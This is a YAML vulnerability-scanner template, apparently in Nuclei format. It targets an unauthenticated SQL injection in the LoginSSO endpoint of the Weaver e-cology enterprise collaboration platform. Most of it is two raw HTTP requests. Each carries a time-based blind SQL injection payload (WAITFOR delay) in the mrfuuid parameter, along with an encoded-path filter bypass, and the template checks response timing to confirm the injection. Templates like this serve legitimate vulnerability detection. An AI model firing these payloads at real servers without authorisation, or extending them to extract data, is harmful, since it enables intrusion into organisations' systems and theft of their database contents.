id: weaver-e-cology-loginsso-sql
info:
  name: 泛微e-cology LoginSSO接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    泛微协同管理应用平台e-cology是一个集成企业信息门户、知识文档管理、工作流程管理等模块的大型协同管理平台。该平台在LoginSSO接口实现中存在SQL注入缺陷，攻击者可通过构造恶意请求在未认证状态下获取数据库敏感数据。

  tags: 泛微
http:
- raw:
  - |
    GET /weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mrfuuid=1%27;if+db_name(1)=%27master%27+WAITFOR+delay+%270:0:5%27--+&mailid=0&a=.swf HTTP/1.1
    Host: {{Hostname}}
  - |
    GET /weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mrfuuid=1%27;if+db_name(1)=%27master%27+WAITFOR+delay+%270:0:8%27--+&mailid=0&a=.swf HTTP/1.1
    Host: {{Hostname}}
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
